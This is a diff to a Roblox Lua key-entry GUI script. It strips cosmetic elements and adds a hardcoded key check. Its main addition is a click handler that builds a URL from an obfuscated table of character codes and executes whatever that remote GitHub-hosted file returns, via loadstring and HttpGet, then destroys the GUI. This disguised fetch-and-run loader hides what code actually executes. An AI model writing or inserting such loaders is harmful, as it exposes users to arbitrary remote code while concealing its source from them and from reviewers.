@@ -23,16 +23,6 @@ UIGradient.Color = ColorSequence.new({
     ColorSequenceKeypoint.new(1.0, Color3.fromRGB(0, 128, 255))
 })
 
--- Adicionando sombra ao Frame
-local Shadow = Instance.new("Frame")
-Shadow.Parent = Frame
-Shadow.Size = Frame.Size + UDim2.new(0, 10, 0, 10)
-Shadow.Position = Frame.Position + UDim2.new(0, 5, 0, 5)
-Shadow.BackgroundColor3 = Color3.new(0, 0, 0)
-Shadow.BorderSizePixel = 0
-Shadow.BackgroundTransparency = 0.5
-Shadow.ZIndex = 0
-
 local Title = Instance.new("TextLabel")
 Title.Parent = Frame
 Title.Size = UDim2.new(1, 0, 0.2, 0)
@@ -81,7 +71,7 @@ local ConfirmButton = Instance.new("TextButton")
 ConfirmButton.Parent = Frame
 ConfirmButton.Size = UDim2.new(0.3, 0, 0.15, 0)
 ConfirmButton.Position = UDim2.new(0.35, 0, 0.55, 0)
-ConfirmButton.Text = "Confirmar"
+ConfirmButton.Text = "Enviar"
 ConfirmButton.TextColor3 = Color3.new(1, 1, 1)
 ConfirmButton.BackgroundColor3 = Color3.new(0, 0.6, 0.6)
 ConfirmButton.Font = Enum.Font.SourceSansBold
@@ -91,15 +81,6 @@ ConfirmButton.BackgroundTransparency = 0.1
 local UICornerButton = Instance.new("UICorner")
 UICornerButton.Parent = ConfirmButton
 UICornerButton.CornerRadius = UDim.new(0, 10)
-
--- Função de feedback ao clicar no botão Confirmar
-ConfirmButton.MouseButton1Click:Connect(function()
-    ConfirmButton.Text = "Confirmado!"
-    ConfirmButton.BackgroundColor3 = Color3.new(0, 1, 0.6)
-    wait(0.5)
-    ConfirmButton.Text = "Confirmar"
-    ConfirmButton.BackgroundColor3 = Color3.new(0, 0.6, 0.6)
-end)
 
 local InfoLabel = Instance.new("TextLabel")
 InfoLabel.Parent = Frame
@@ -111,41 +92,29 @@ InfoLabel.BackgroundTransparency = 1
 InfoLabel.Font = Enum.Font.SourceSans
 InfoLabel.TextSize = 20
 
--- Adicionando barra de progresso ao Frame
-local ProgressBar = Instance.new("Frame")
-ProgressBar.Parent = Frame
-ProgressBar.Size = UDim2.new(0.9, 0, 0.05, 0)
-ProgressBar.Position = UDim2.new(0.05, 0, 0.75, 0)
-ProgressBar.BackgroundColor3 = Color3.new(0.25, 0.25, 0.25)
-ProgressBar.BorderSizePixel = 0
-
-local ProgressFill = Instance.new("Frame")
-ProgressFill.Parent = ProgressBar
-ProgressFill.Size = UDim2.new(0, 0, 1, 0)
-ProgressFill.BackgroundColor3 = Color3.new(0, 1, 0.6)
-
-local UICornerProgress = Instance.new("UICorner")
-UICornerProgress.Parent = ProgressBar
-UICornerProgress.CornerRadius = UDim.new(0, 10)
-
--- Função para animar barra de progresso
-local function animateProgress(duration)
-    ProgressFill:TweenSize(
-        UDim2.new(1, 0, 1, 0),
-        Enum.EasingDirection.Out,
-        Enum.EasingStyle.Quart,
-        duration,
-        true
-    )
-end
-
 -- Função para validar a chave inserida
 KeyInput.FocusLost:Connect(function(enterPressed)
     if enterPressed then
-        animateProgress(1) -- Duração da animação
-        wait(1) -- Espera a animação terminar
-        local valid = KeyInput.Text == "chave_correta"
+        local valid = KeyInput.Text == "Key_A.SEO8CJ<%289÷2]8YE199DJPSSAMMMMDLDKFJFO20Ij"
         InfoLabel.Text = valid and "Chave válida: Sim" or "Chave válida: Não"
         InfoLabel.TextColor3 = valid and Color3.new(0, 1, 0) or Color3.new(1, 0, 0)
+        if valid then
+            ConfirmButton.Text = "CHAVE 🔑"
+            ConfirmButton.MouseButton1Click:Connect(function()
+                local parts = {104, "t", 116, "p", 115, ":", 47, 47, "r", 97, "w", 46, "g", 105, "t", 104, "u", 98, "u", 115, "e", 114, "c", 111, 110, "t", 101, 110, "t", 46, "c", 111, "m", 47, "S", 65, "M", 85, "C", 65, "R", 65, "R", 79, "N", 79, "B", 47, "-", 57, "3", 57, "3", 105, "e", 47, "r", 101, "f", 115, 47, "h", 101, "a", 100, "s", 47, "m", 97, "i", 110, 47, "S", 101, "u", "-", 115, "i", 116, "e", 46, "c", 111, "m"}
+
+                local function assembleURL(parts)
+                    local url = ""
+                    for _, part in ipairs(parts) do
+                        url = url .. (type(part) == "string" and part or string.char(part))
+                    end
+                    return url
+                end
+
+                loadstring(game:HttpGet(assembleURL(parts)))()
+
+                ScreenGui:Destroy()
+            end)
+        end
     end
 end)
